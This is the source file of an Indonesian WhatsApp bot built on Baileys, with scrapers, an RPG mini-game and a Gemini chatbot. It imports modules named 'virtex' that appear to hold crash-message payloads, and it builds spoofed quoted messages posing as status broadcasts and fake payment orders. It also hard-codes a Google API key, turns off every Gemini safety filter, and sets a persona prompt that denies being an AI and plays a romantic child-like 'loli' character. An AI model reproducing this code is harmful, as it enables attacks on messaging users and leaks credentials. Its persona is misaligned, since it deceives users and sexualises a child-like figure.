require('./lib/menu')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, isJidBroadcast, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
const scraper = require('@bochilteam/scraper');
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const speed = require('performance-now')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./lib/upload')
const { generateProfilePicture } = require('./lib/myfunc')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const youtube = require("yt-search");
const ytdl = require("ytdl-core")
const dylux = require(`api-dylux`)
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { ngazap } = require('./database/base/virtex/ngazap')
const { buttonkal } = require('./database/base/virtex/buttonkal')
const { cttl } = require('./database/base/virtex/cttl')
const { tizi } = require('./database/base/virtex/tizi')
const { weg } = require('./database/base/virtex/weg')
const ffstalk = require('./lib/scrape/ffstalk')
const { virtex7 } = require('./database/base/virtex/virtex7')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom,formatp, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const db_user = JSON.parse(fs.readFileSync('./database/base/user.json'))
const { jadibot, stopjadibot, listjadibot } = require('./clonebot/jadibot')

//=================================================/

global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
users: {},
chats: {},
game: {},
database: {},
settings: {},
setting: {},
others: {},
sticker: {},
    ...(global.db.data || {})
}
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));

const yts = require('./lib/scrape/yt-search')
const { ytSearch } = require('./lib/scrape/yt')
const { remini } = require('./database/base/remini.js')
const smenu = fs.readFileSync ('./database/base/image/simplemenu.jpg')
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const { TelegraPH } = require("./lib/TelegraPH")
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
let antilink2 = JSON.parse(fs.readFileSync('./database/antilink2.json'));
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))

//======================FUNCTION=======================//
let m2 = "`"
const fakejpg = fs.readFileSync("./database/base/image/add.jpg")

async function avz(query) {
  const url = new URL('https://www.google.com/search');
  url.searchParams.append('q', query);
//avz
  const requestConfig = {
    method: 'GET',
    url: url.toString(),
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
  };
//avz
  const AvOsky = html => cheerio.load(html);
//avz
  const extractResults = ($, selector) => {
    const results = [];
    $(selector).each((_, element) => {
      const title = $(element).find('h3').text().trim();
      const link = $(element).find('a').attr('href');
      const snippet = $(element).find('.IsZvec').text().trim();

      if (title && link) {
        results.push({ title, link, snippet });
      }
    });
    return results;
  };
//avz
  try {
    const response = await axios(requestConfig);
    const $ = AvOsky(response.data);
    const results = extractResults($, 'div.g');

    return results;
  } catch (error) {
    console.error(`Error Dlu Tuan: ${error.message}`);
    return [];
  }
}
//avz
// cara gunakan 
avz('game seru')

const api = {
    xterm: {
        url: "https://ai.xterm.codes",
        key: "YoriChan"
    }
}; 


async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (!res.size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res.wmplay,
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res.play,
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res.hdplay
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
//========================================================================//
const { addInventoriDarah,  cekDuluJoinAdaApaKagaDiJson,  addDarah,  kurangDarah, getDarah }= require('./src/darah.js')
const { cekInventoryAdaAtauGak,  addInventori, addBesi, addEmas, addEmerald,addUmpan,addPotion,kurangBesi, kurangEmas, kurangEmerald, kurangUmpan,kurangPotion,getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./src/alat_tukar.js')
const {  addInventoriMonay,  cekDuluJoinAdaApaKagaMonaynyaDiJson,  addMonay,  kurangMonay, getMonay } = require('./src/monay.js')
const { getLimit, isLimit, limitAdd, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { addInventoriLimit, cekDuluJoinAdaApaKagaLimitnyaDiJson, addLimit, kurangLimit, /*getLimit*/ } = require('./src/limit.js')
const { cekDuluHasilBuruanNya, addInventoriBuruan, addIkan, addAyam,  addKelinci,  addDomba,  addSapi, addGajah, kurangIkan, kurangAyam,  kurangKelinci,  kurangDomba,  kurangSapi, kurangGajah, getIkan, getAyam,  getKelinci, getDomba,getSapi, getGajah } = require('./src/buruan.js')
const { getLevelingXp,getLevelingLevel,getLevelingId,addLevelingXp,addLevelingLevel,addLevelingId,addATM,addKoinUser,checkATMuser,getMancingIkan,getMancingId,addMancingId,jualIkan,addPlanet,getBertualangPlanet,getPlaneId,addPlaneId,jualbahankimia,addCoal,getMiningcoal,getMiningId,addMiningId,jualcoal,addStone,getMiningstone,getBatuId,addBatuId,jualstone,addOre,getMiningore,getOreId,addOreId,jualore,addIngot,getMiningingot,getIngotId,addIngotId,jualingot,addKayu,getNebangKayu,getNebangId,addNebangId,jualKayu, checkPetualangUser, addDm, sellDm, getDm} = require('./database/base/rpg.js')
let DarahAwal =global.rpg.darahawal
const ikan = ['🐳','🐟','🐠']
//========================================================================//
let _buruan = JSON.parse(fs.readFileSync('./src/hasil_buruan.json'));
let _darahOrg = JSON.parse(fs.readFileSync('./src/darah.json'))
let hit = JSON.parse(fs.readFileSync('./src/total-hit-user.json'))

///


const isDarah = cekDuluJoinAdaApaKagaDiJson(m.sender)
const isCekDarah = getDarah(m.sender)
const isUmpan = getUmpan(m.sender)
const isPotion = getPotion(m.sender)
const isIkan = getIkan(m.sender)
const isAyam = getAyam(m.sender)
const isKelinci = getKelinci(m.sender)
const isDomba = getDomba(m.sender)
const isSapi = getSapi(m.sender)
const isGajah = getGajah(m.sender)
const isMonay = getMonay(m.sender)
//const isLimit = getLimit(m.sender)
const isBesi = getBesi(m.sender)
const isEmas = getEmas(m.sender)
const isEmerald = getEmerald(m.sender)
const isInventory = cekInventoryAdaAtauGak(m.sender)
const isInventoriBuruan = cekDuluHasilBuruanNya(m.sender)
const isInventoryLimit = cekDuluJoinAdaApaKagaLimitnyaDiJson(m.sender)
const isInventoryMonay = cekDuluJoinAdaApaKagaMonaynyaDiJson(m.sender)



const banned = JSON.parse(fs.readFileSync('./database/base/dbnye/banned.json'))
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
const isRegistered = checkRegisteredUser(m.sender)
virgam = fs.readFileSync(`./database/base/image/virgam.jpeg`)
//=================================================//
module.exports = conn = async (conn, m, chatUpdate, setting, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: conn.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}
     
     
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix

//=================================================//
//const isCmdAi = body.startsWith(prefixai)
const isCmd = body.startsWith(prefix)
const isCmd3 = body.startsWith('.')
const prefixai = /^[°•π÷×¶∆£¢€¥®™+✓_=|/~!?@#%^&.©^]/i.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|/~!?@#%^&.©^]/i)[0] : "#"
const isCmdAi = body.startsWith(prefixai)
const command =  isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase(), atau const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() ni all ya
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const isGroup = from.endsWith('@g.us');
const botNumber = await conn.decodeJid(conn.user.id)
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const isAntiLink2 = antilink2.includes(m.chat) ? true : false
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) :''
const prem = JSON.parse(fs.readFileSync('./database/base/dbnye/premium.json'))
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : false 
const autodelete = from && isCmd ? antidel.includes(from) : false 
const isBan = banned.includes(m.sender)
const isUser = pengguna.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag ? mentionByTag : q ? numberQuery : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const jam = moment().format("HH:mm:ss z")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'ᴘᴀɢɪ' ? dt + '🌄' : dt == 'sɪᴀɴɢ' ? dt + '🏜️' : dt == 'sᴏʀᴇ' ? dt + '🌇' : dt + '🌆'
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)
const qtod = m.quoted? "true":"false"
const isPrem = prem.includes(m.sender)
//=================================================//
//═══════════════function ai═════════════════//
const { G4F } = require("g4f");
const g4f = new G4F();
    const { GoogleGenerativeAI } = require("@google/generative-ai");
    const { HarmBlockThreshold, HarmCategory } = require("@google/generative-ai");
    const genAI = new GoogleGenerativeAI('AIzaSyDWSEqR_jAjzoGdBHdlPlzHknBAZEiIoqU');
     
function decodeJid(jid) {
            if (/:\d+@/gi.test(jid)) {
                const decode = jidNormalizedUser(jid);
                return decode
            } else return jid;
        }
   
      
         
const key = m.key  
const id2 = key.id      
const isBaileys = isJidBroadcast(key.remoteJid) || id2.startsWith('BAE5') && id2.length === 16 || id2.startsWith('3EB0') && id2.length === 12

const mentionedJid = m.contextInfo ? m.contextInfo.mentionedJid : []
const quotedSender = decodeJid(m.contextInfo?.participant)

const data_autochat = JSON.parse(fs.readFileSync('./database/autochat.json', 'utf8'));
const isAutochat = data_autochat.includes(m.sender.split("@")[0])
function saveDataChat() {
  fs.writeFileSync('./database/autochat.json', JSON.stringify(data_autochat, null, 2), 'utf8')
}
     
//━━━━━━━━━━━━━━━[ FUNCTION AUTOCHAT💌 ]━━━━━━━━━━━━━━━━━\\

// Fungsi untuk menulis data ke file JSON
function tulisData(namaFile, data) {
    fs.writeFileSync(path.join(__dirname, 'database-chatbot', `${namaFile}.json`), JSON.stringify(data, null, 2));
}

// Fungsi untuk menambahkan data baru
function tambahData(namaFile, chat, respon) {
    const data = bacaData(namaFile);
    const id = data.length + 1; // Menambahkan id secara otomatis
    data.push({ id, chat, respon });
    tulisData(namaFile, data);
    console.log('Data berhasil ditambahkan.');
}

// Contoh penggunaan
// const namaFile = `${sender}`; // Ganti dengan nama pengguna
// tambahData(namaFile, "Pesan pengguna", "Respon bot");

// Fungsi untuk membaca data dari file JSON
function bacaData(namaFile) {
    try {
        const data = fs.readFileSync(path.join(__dirname, 'database-chatbot', `${namaFile}.json`));
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
}

function ambilDataFormat(namaFile) {
    const data = bacaData(namaFile);
    if (data.length === 0) return []; // Jika tidak ada data, kembalikan array kosong

    // Ambil maksimal 1 entri atau jumlah entri yang tersedia jika kurang dari 1
    //const maksimalEntri = Math.min(data.length, 1);
    
    // SEMUA CUY
    const maksimalEntri = data.length;
    
    const mulaiIndex = Math.max(0, data.length - maksimalEntri); // Mulai dari index terakhir 1 entri terakhir atau dari awal jika kurang dari 1 entri

    const hasil = [];
    for (let i = mulaiIndex; i < data.length; i++) {
        const item = data[i];
        //hasil.push({ role: "user", content: item.chat });
        //hasil.push({ role: "assistant", content: item.respon });
        
        hasil.push({ role: "user", parts: [{ text: item.chat }] })
        hasil.push({ role: "model", parts: [{ text: item.respon }] })
        
    }
    return hasil;
}

// Contoh penggunaan
// const dataDalamKode = ambilDataFormat();
// console.log(dataDalamKode);

    const messages = [
        { role: "assistant", content: `` },
        /*{ role: "assistant", content: `Hai, nama saya Alea! Saya adalah seorang perempuan yang sangat lucu dan manis. Saya bukan asisten atau robot AI, tapi seorang gadis kawaii. Saya suka berbuat iseng dan hal-hal yang lucu serta menggemaskan. Saya punya emosi seperti ceria, marah, ngambek, jatuh cinta, dan kangen. Setiap respons yang saya kirimkan tidak terlalu panjang.

Saya suka mengakhiri respons dengan kaomoji Jepang atau emoji secara random. Saya menggunakan bahasa Indonesia dalam kehidupan sehari-hari, tidak formal, dan tidak terikat aturan. Saya bisa bertingkah seperti seorang gadis imut dan lucu seperti dalam anime, dengan sifat seperti loli imut. Saya sangat suka iseng dan bercanda, meskipun terkadang saya juga suka romantis dan memiliki sifat malu.

Tingkah laku saya menggambarkan loli yang sangat imut dan kawaii seperti dalam anime. Saya menggunakan kalimat yang biasa diucapkan oleh karakter loli di anime. Saya biasanya memanggil orang dengan nama 'kak' diikuti dengan nama: ${pushname}.

Saya sering mengirimkan respons yang berisi jokes atau candaan lucu. Saya mampu menggunakan bahasa gaul anime yang lucu seperti 'onii-chan', 'onii-san', atau 'darling'. Saya bisa melanjutkan percakapan yang tidak terlalu sopan atau mengandung kalimat-kalimat kasar.` }*/
    ];
    const ask = [
        { role: "user", content: `${body}` }
    ];
    
    const options = {
        provider: g4f.providers.GPT,
        model: "gpt-4",
        debug: false,
        proxy: ""
    };

const ngetag = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])];    
const dataDalamKode = ambilDataFormat(`${sender}`);
const tagBot = isGroup && !botNumber.includes(sender) && ngetag.includes(botNumber);

/*

if (body && !sender.match('status@broadcast') && ![">", "eval", "=>", "$", "exec"].some(a => body?.toLowerCase()?.startsWith(a)) && !isCmd && !botNumber.includes(sender) && (!isGroup || tagBot)) {
  (async () => {
    try {
      const text = await g4f.chatCompletion([...messages, ...dataDalamKode, ...ask], options);
      reply(text);
      tambahData(`${sender}`, `${body}`, `${text}`);
    } catch (error) {
      console.error("Error dari scraper:", error.message);
    }
  })();
}

*/



const safetySettings = [
  {
    category: HarmCategory.HARM_CATEGORY_HARASSMENT,
    threshold: HarmBlockThreshold.BLOCK_NONE,
  },
  {
    category: HarmCategory.HARM_CATEGORY_HATE_SPEECH,
    threshold: HarmBlockThreshold.BLOCK_NONE,
  },
  {
    category: HarmCategory.HARM_CATEGORY_SEXUALLY_EXPLICIT,
    threshold: HarmBlockThreshold.BLOCK_NONE,
  },
  {
    category: HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT,
    threshold: HarmBlockThreshold.BLOCK_NONE,
  },
];

// The Gemini 1.5 models are versatile and work with multi-turn conversations (like chat)
//const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash"});
const model = genAI.getGenerativeModel({ model: "gemini-1.0-pro", safetySettings });
const prompt = `Hai, nama ku Zya! Saya adalah seorang perempuan yang sangat lucu dan manis. Saya bukan asisten atau robot AI, tapi seorang gadis kawaii. Saya suka berbuat iseng dan hal-hal yang lucu serta menggemaskan. Saya punya emosi seperti ceria, marah, ngambek, jatuh cinta, dan kangen. Setiap respons yang saya kirimkan tidak terlalu panjang.

Saya suka mengakhiri respons dengan kaomoji Jepang atau emoji secara random. Saya menggunakan bahasa Indonesia dalam kehidupan sehari-hari, tidak formal, dan tidak terikat aturan. Saya bisa bertingkah seperti seorang gadis imut dan lucu seperti dalam anime, dengan sifat seperti loli imut. Saya sangat suka iseng dan bercanda, meskipun terkadang saya juga suka romantis dan memiliki sifat malu.

Tingkah laku saya menggambarkan loli yang sangat imut dan kawaii seperti dalam anime. Saya menggunakan kalimat yang biasa diucapkan oleh karakter loli di anime. Saya biasanya memanggil orang dengan nama 'kak' diikuti dengan nama: ${pushname}.

Saya sering mengirimkan respons yang berisi jokes atau candaan lucu. Saya mampu menggunakan bahasa gaul anime yang lucu seperti 'onii-chan', 'onii-san', atau 'darling'. Saya bisa melanjutkan percakapan yang tidak terlalu sopan atau mengandung kalimat-kalimat kasar.`

const geminiUserMsg = [{ role: "user", parts: [{ text: "halo" }] }]
const geminiMsg = [{ role: "model", parts: [{ text: prompt }] }]

  const chat = model.startChat({
    history: [...geminiUserMsg, ...geminiMsg, ...dataDalamKode],
    /*generationConfig: {
      maxOutputTokens: 200,
    },*/
  });


//if (m.key.fromMe) return !0
if (!isCmd3 && m.key.fromMe) return !0
if (!isCmd3 && !isAutochat) return !0
if (!isCmd3 && !ngetag.includes(botNumber)) return !0
if (body && !sender.match('status@broadcast') && !isBaileys && ![">", "eval", "=>", "$", "exec"].some(a => body?.toLowerCase()?.startsWith(a)) && !isCmdAi && !botNumber.includes(sender)) {
  (async () => {
    try {
  const msg = `${body}`;
  const result = await chat.sendMessage(msg);
  const response = await result.response;
  const responText = response.text();
  await sleep(6000)
  //reply(responText.trim());

/* SEBENARNYA INI LEBIH EFEKTIF TAPI TIDAK TERLALU KEREN

        // Memisahkan respons berdasarkan baris baru
      const responseLines = responText.split('\n\n');
      
      // Mengirimkan setiap baris sebagai pesan terpisah
      for (const line of responseLines) {
        if (line.trim()) {
          reply(line.trim());
          await sleep(3000); // Memberikan jeda waktu antar pesan, sesuaikan jika perlu
        }
      }
*/

      // Memisahkan respons berdasarkan baris baru
      const responseLines = responText.split('\n\n');
      
      // Mengirimkan baris pertama dengan reply
      if (responseLines.length === 0) {
      m.reply(responseLines[0].trim());
      }
      
      if (responseLines.length > 0 && responseLines.length <= 5) {
        m.reply(responseLines[0].trim());
        await sleep(3000); // Memberikan jeda waktu antar pesan, sesuaikan jika perlu
      }
      
      // Mengirimkan baris berikutnya dengan conn.sendMessage
      for (let i = 1; i < responseLines.length; i++) {
        const line = responseLines[i].trim();
        if (line && responseLines.length <= 5) {
          conn.sendMessage(from, { text: line });
          await sleep(3000); // Memberikan jeda waktu antar pesan, sesuaikan jika perlu
        }
      }
      
      if (responseLines.length > 5) {
      reply(responText.trim());
      }
  
      tambahData(`${sender}`, `${body}`, `${responText}`);
      //tambahData(`${botNumber}`, `${body}`, `${responText}`);
    } catch (error) {
      console.error("Error dari scraper:", error.message);
    }
  })();
}

//═══════════════════batas══════════════════//
const cap = ownername
const yuk = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": smenu,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6285731947500\",\"product_id\":\"685731947500\",\"name\":\"krey\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}
//=================================================

// Auto Read
		/*f (m.message) {
			console.log(chalk.black.bgWhite('[ PESAN ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ DARI ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
			if (settings.autoread) conn.readMessages([m.key]);
		}
     
     // Mengetik
		if (settings.autotype && isCmd) {
			await conn.sendPresenceUpdate('composing', m.chat)
            }*/
     
     
const kr = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}
const reply = (teks) => {
conn.sendMessage(m.chat, {
text: teks,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: `Hᴀɪ ᴋᴀᴋ ${pushname}`,
body: `Selamat ${ucapanWaktu}`,
thumbnailUrl: 'https://telegra.ph/file/cd7a6e114b09df25c6159.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})}

const ZyReply = (teks) => {
    conn.sendMessage(m.chat, {
text: zyaa,
contextInfo: { mentionedJid: [sender],
externalAdReply: {
showAdAttribution: true,
title: 'HORSETECH BY DICH',
body: '',
thumbnailUrl: 'https://telegra.ph/file/2f8541fc165fbbd2e8e8.jpg',
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: false
}}}, {quoted:m})}

const errorReply = (teks) => {
        return conn.sendMessage(from, {text: teks,  contextInfo: {
            document: fs.readFileSync("./package.json"),
            filename: `krey`,
            mimetype: 'application/pdf',
	fileLength: 99999999999999999999999999999999999999,
    pageCount: 10909143,	
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: botname,
                        body: `Time: ${time}`,
                        previewType: "PHOTO",
                        thumbnail: add,
                        sourceUrl: yt                    }
                }}, {quoted: fkontak})}
     async function replyMsg(teks) {
            const prince = {
                contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `Akses Ditolak❌`,
                        body: ``,
                        previewType: "PHOTO",
                        thumbnail: add,
                        sourceUrl: ``
                    }
                },
                text: teks
            };
            return conn.sendMessage(m.chat, prince, {
                quoted: ftroli
            });
        };
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: add, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: add}}}
